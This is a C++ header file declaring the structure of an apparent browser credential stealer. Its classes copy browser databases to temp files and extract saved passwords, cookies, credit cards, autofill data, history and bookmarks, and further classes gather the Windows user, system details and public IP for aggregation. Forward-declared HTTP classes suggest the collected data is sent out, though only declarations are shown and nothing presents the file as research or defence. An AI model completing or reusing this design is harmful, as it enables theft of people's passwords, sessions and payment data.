#pragma once

#include <string>
#include <memory>
#include <unordered_map>
#include <unordered_set>
#include <vector>
#include <functional>

#include "sqlite3.h"
#include "BrowserInfo.h"
#include "json.hpp"

struct HTTPResponse;
class HTTPClient;

class DataRetriever {
public:
    virtual ~DataRetriever() = default;
    virtual std::wstring retrieveData() = 0;
};

class DatabaseRetriever : public DataRetriever {
public:
    DatabaseRetriever(const BrowserInfo& browser, const std::wstring& dbPath, const std::wstring& dataType);
    std::wstring retrieveData() override;

protected:
    virtual std::string getSQL() const = 0;
    virtual std::wstring processRows(sqlite3_stmt* stmt) const = 0;

    BrowserInfo browserInfo;
    std::wstring dbPath;
    std::wstring dataType;

    std::wstring copyDatabaseToTemp(const std::wstring& dbPath) const;
};

class BrowserHistoryRetriever : public DatabaseRetriever {
public:
    BrowserHistoryRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class BrowserPasswordsRetriever : public DatabaseRetriever {
public:
    BrowserPasswordsRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class BrowserCookiesRetriever : public DatabaseRetriever {
public:
    BrowserCookiesRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class BrowserCreditCardsRetriever : public DatabaseRetriever {
public:
    BrowserCreditCardsRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class BrowserAutofillRetriever : public DatabaseRetriever {
public:
    BrowserAutofillRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class BrowserSearchHistoryRetriever : public DatabaseRetriever {
public:
    BrowserSearchHistoryRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class BrowserDownloadHistoryRetriever : public DatabaseRetriever {
public:
    BrowserDownloadHistoryRetriever(const BrowserInfo& browser);

protected:
    std::string getSQL() const override;
    std::wstring processRows(sqlite3_stmt* stmt) const override;
};

class FileRetriever : public DataRetriever {
public:
    FileRetriever(const BrowserInfo& browser);
protected:
    BrowserInfo browserInfo;
    std::wstring copyFileToTemp(const std::wstring& filePath) const;
};

class BrowserBookmarksRetriever : public FileRetriever {
public:
    BrowserBookmarksRetriever(const BrowserInfo& browser);
    std::wstring retrieveData() override;

private:
    void extractBookmarks(const nlohmann::json& node, std::wstring& info, const std::wstring& folder, int depth) const;
};

class WindowsUserRetriever : public DataRetriever {
public:
    std::wstring retrieveData() override;
};

class SystemInfoRetriever : public DataRetriever {
public:
    std::wstring retrieveData() override;
private:
    std::wstring getSystemArchitecture(unsigned short architecture);
};

class IPAddressRetriever : public DataRetriever {
public:
    std::wstring retrieveData() override;
private:
    std::wstring getPublicIP();
};

class DataCollector {
public:
    void addRetriever(std::unique_ptr<DataRetriever> retriever);
    std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>> collectData() const;

private:
    void addToAggregatedData(std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>>& aggregatedData,
        const std::wstring& header,
        const std::wstring& content) const;

    std::vector<std::unique_ptr<DataRetriever>> retrievers;
};
